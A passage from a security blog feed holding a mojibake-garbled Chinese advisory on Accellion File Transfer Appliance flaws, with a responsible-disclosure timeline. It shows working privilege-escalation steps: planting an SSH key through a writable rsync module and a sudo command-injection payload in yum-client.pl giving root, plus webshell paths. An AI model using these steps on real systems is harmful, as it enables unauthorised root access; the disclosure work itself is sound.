æ›´å„ªé›…çš„æ–¹å¼å¯ä»¥é€é include èªæ³•å¼•å…¥ä¸Šå‚³æª”æ¡ˆçš„ tmp_nameï¼Œé€™æ¨£å„ç¨®ä¿è­·éƒ½ä¸ç”¨æ“”å¿ƒï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(include $_FILES[file][tmp_name]);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;local-privilege-escalation-cve-2016-2352-and-cve-2016-2353&quot;&gt;Local Privilege Escalation (CVE-2016-2352 and CVE-2016-2353)&lt;/h4&gt;
&lt;p&gt;åœ¨å–å¾— PHP ç¶²é æ¬Šé™å¾Œï¼Œç™¼ç¾æ‰€å±¬æ¬Šé™ç‚º nobodyï¼Œç‚ºäº†é€²è¡Œæ›´æ·±å…¥çš„ç ”ç©¶ï¼Œåœ¨å°ç’°å¢ƒé€²è¡Œå¯©è¦–å¾Œï¼Œç™¼ç¾å…©å€‹å¯ç”¨ä¾†æå‡æ¬Šé™ä¹‹å¼±é»ã€‚&lt;/p&gt;

&lt;h5 id=&quot;1-rsync-é…ç½®éŒ¯èª¤&quot;&gt;1. Rsync é…ç½®éŒ¯èª¤&lt;/h5&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/opt/rsyncd.conf&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lighttpd&quot; data-lang=&quot;lighttpd&quot;&gt;log file = /home/soggycat/log/kennel.log
...
[soggycat]
path = /home/soggycat
uid = soggycat
read only = false
list = false
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å…¶ä¸­æ¨¡çµ„åç¨± soggycat å° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/soggycat/&lt;/code&gt; ç‚ºä»»ä½•äººå¯è®€å¯å¯«ï¼Œæ‰€ä»¥å¯å°‡ SSH Key å¯«è‡³ /home/soggycat/.ssh/ å¾Œä»¥ soggycat èº«åˆ†ç™»å…¥&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/
drwx------        4096 2016/01/29 18:13:41 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;         606 2016/01/29 18:13:41 authorized_keys

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/authorized_keys &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;id_dsa.pub &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; authorized_keys
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync authorized_keys 0::soggycat/.ssh/

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_dsa &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;UserKnownHostsFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;StrictHostKeyChecking&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no soggycat@localhost &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;Could not create directory &lt;span class=&quot;s1&quot;&gt;&apos;/.ssh&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&apos;0,0.0.0.0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to the list of known hosts.
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;520&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;soggycat&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;2-command-injection-in-yum-clientpl&quot;&gt;2. Command Injection in â€œyum-client.plâ€&lt;/h5&gt;

&lt;p&gt;åœ¨ FTA ä¸­ï¼Œç‚ºäº†ä½¿ç³»çµ±å¯ä»¥ç›´æ¥é€éç¶²é ä»‹é¢é€²è¡Œæ›´æ–°ï¼Œå› æ­¤åœ¨ sudoers é…ç½®ä¸­ç‰¹åˆ¥é‡å° nobody ç”¨æˆ¶å…è¨±ç›´æ¥ä½¿ç”¨ root æ¬Šé™åŸ·è¡ŒæŒ‡ä»¤ï¼Œä¸¦é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt; é€™éš»ç¨‹å¼é€²è¡Œè»Ÿé«”æ›´æ–°&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/sudoers&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;
Cmnd_Alias      YUM_UPGRADE = /usr/bin/yum -y upgrade
Cmnd_Alias      YUM_CLIENT = /usr/local/bin/yum-client.pl
&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
root     ALL=(ALL) &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt;
admin    &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: UPDATE_DNS, UPDATE_GW, UPDATE_NTP, RESTART_NETWORK, CHMOD_OLDTEMP ...
nobody   &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: SSL_SYSTEM, ADMIN_SYSTEM, IPSEC_CMD, YUM_CLIENT
soggycat &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: ADMIN_SYSTEM, IPSEC_CMD, CHOWN_IPSEC, UPDATE_IPSEC, YUM_CLIENT
radmin   &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: RESET_APPL
&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å…¶ä¸­ YUM_CLIENT å°±æ˜¯é€²è¡Œæ›´æ–°çš„æŒ‡ä»¤ï¼Œéƒ¨åˆ†ä»£ç¢¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/usr/local/bin/yum-client.pl&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;GetOptions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cdrom=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;appid=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$appid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;servername=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$servername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;version=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;token=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/usr/bin/yum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# if this is based on RHEL 5, change the repository&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;grep -q 5 /etc/redhat-release &amp;amp;&amp;amp; echo -n 5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;`;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/home/seos/log/yum-client.log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$STATUSFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/home/seos/log/yum-client.status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMCONFIG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/etc/yum.conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMDIFF_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/home/seos/log/yum.diff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;eq&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;){&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -c &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/yum.conf-5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -c &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/yum.conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mkdir -p /mnt/cdrom &amp;amp;&amp;amp; mount -o loop &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;fdielog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;unable to mount: $!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;æ·±å…¥è§€å¯Ÿ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt; å¾Œå¯ç™¼ç¾åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--cdrom&lt;/code&gt; åƒæ•¸ä¸Šå­˜åœ¨ Command Injectionï¼Œä½¿å¾—æ”»æ“Šè€…å¯å°‡ä»»æ„æŒ‡ä»¤æ’å…¥åƒæ•¸å…§ä¸¦ä»¥ root èº«åˆ†åŸ·è¡Œ&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/bin/yum-client.pl &lt;span class=&quot;nt&quot;&gt;--cdrom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;$(id &amp;gt; /tmp/.gg)&apos;&lt;/span&gt;
mount: can&lt;span class=&quot;s1&quot;&gt;&apos;t find /mnt/cdrom in /etc/fstab or /etc/mtab
unable to mount: Bad file descriptor at /usr/local/bin/yum-client.pl line 113.


bash-3.2$ cat /tmp/.gg
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å³å¯ä»¥ root èº«åˆ†åŸ·è¡Œä»»æ„æŒ‡ä»¤ï¼
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;å¾Œé–€&quot;&gt;å¾Œé–€&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
åœ¨å–å¾—æœ€é«˜æ¬Šé™å¾Œï¼Œé–‹å§‹å°ä¼ºæœå™¨é€²è¡Œä¸€äº›å¯©è¦–æ™‚ï¼Œç™¼ç¾å·²æœ‰å¹¾æ¬¾å¾Œé–€è—åœ¨ FTA ä¸»æ©Ÿä¸­äº†ï¼Œç¶“éç ”ç©¶å¾Œé¦–å…ˆç¢ºèªä¸€æ¬¾ IRC BOT ç‚º Niara æ‰€ç™¼å¸ƒçš„ &lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;å¼±é»å ±å‘Š&lt;/a&gt; ä¸­æœ‰æåŠï¼Œæ­¤å¤–ï¼Œé¡å¤–ç™¼ç¾å…©æ¬¾ä¸åŒé¡å‹çš„ PHP Webshell ä¸¦ç„¡åœ¨å…¬é–‹çš„å ±å‘Šä¸­ç™¼ç¾ï¼Œé€é Apache Log æ™‚é–“æ¨æ¸¬æ‡‰è©²æ˜¯é€é 2015 å¹´ä¸­çš„ CVE-2015-2857 æ‰€æ”¾ç½®ä¹‹å¾Œé–€ã€‚&lt;/p&gt;

&lt;p&gt;PHPSPY å¾Œé–€ï¼Œå…¨çƒ 1217 å°å­˜æ´»ä¸»æ©Ÿä¸Šå…±ç™¼ç¾ 62 å°ï¼Œæ”¾ç½®è·¯å¾‘æ–¼ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/Redirector_Cache.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;WSO å¾Œé–€ï¼Œå…¨çƒ 1217 å°å­˜æ´»ä¸»æ©Ÿä¸Šå…±ç™¼ç¾ 9 å°ï¼Œæ”¾ç½®è·¯å¾‘æ–¼ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/imag.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;è‡´è¬&quot;&gt;è‡´è¬&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
é€™ä»½ Advisory æ‰€æåŠçš„å¼±é»ç‚ºåœ¨ 2016 äºŒæœˆæ™‚åƒåŠ  Facebook Bug Bounty æ™‚å°‹æ‰¾åˆ°çš„ï¼Œè©³æƒ…å¯åƒè€ƒæ–‡ç« ã€Š&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;æ»²é€ Facebook çš„æ€è·¯èˆ‡ç™¼ç¾&lt;/a&gt;ã€‹ï¼Œæ‰¾åˆ°å¼±é»çš„ç•¶ä¸‹ç«‹å³å›å ±åŒ…æ‹¬ Accellion åŠ Facebookï¼ŒAccellion ä¸¦åœ¨ 2/12 è™Ÿå°‡æ­¤ä»½å¼±é»è¨˜éŒ„åœ¨ FTA_9_12_40 ä¸¦é€šçŸ¥æ‰€æœ‰å—å½±éŸ¿çš„å®¢æˆ¶å®‰è£ä¿®è£œç¨‹å¼ã€‚&lt;/p&gt;

&lt;p&gt;æ„Ÿè¬ Facebook ä»¥åŠ Accellion çš„è¿…é€Ÿåæ‡‰è·Ÿé…åˆ : )
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/06 05:21 è¯çµ¡ Accellion è©¢å•ä½•è™•å¯å›å ±å¼±é»&lt;/li&gt;
  &lt;li&gt;2016/02/07 12:35 å°‡å ±å‘Šå¯„è‡³ Accellion Support Team&lt;/li&gt;
  &lt;li&gt;2016/03/03 03:03 Accellion Support Team é€šçŸ¥æœƒåœ¨ FTA_9_12_40  ä¿®å¾©&lt;/li&gt;
  &lt;li&gt;2016/05/10 15:18 è©¢å•å°‡æ’°å¯« Advisory è¨±å¯åŠé€šçŸ¥ç™¼ç¾å…©æ¬¾å¾Œé–€å­˜åœ¨&lt;/li&gt;
  &lt;li&gt;2016/06/06 10:20 é›™æ–¹è¨è«–å®šç¨¿&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;åƒè€ƒ&quot;&gt;åƒè€ƒ&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt; &lt;a name=&quot;ref1&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/resources/advisories/R7-0039.jsp&quot;&gt;Rapid7 Advisory R7-0039: Accellion File Transfer Appliance Multiple Vulnerabilities&lt;/a&gt; &lt;a name=&quot;ref2&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Threat Advisory: Accellion File Transfer Appliance Vulnerability&lt;/a&gt; &lt;a name=&quot;ref3&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/</link>
                <guid>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability</guid>
                <pubDate>Thu, 22 Sep 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Advisory: Accellion File Transfer Appliance Vulnerability</title>
                <description>&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
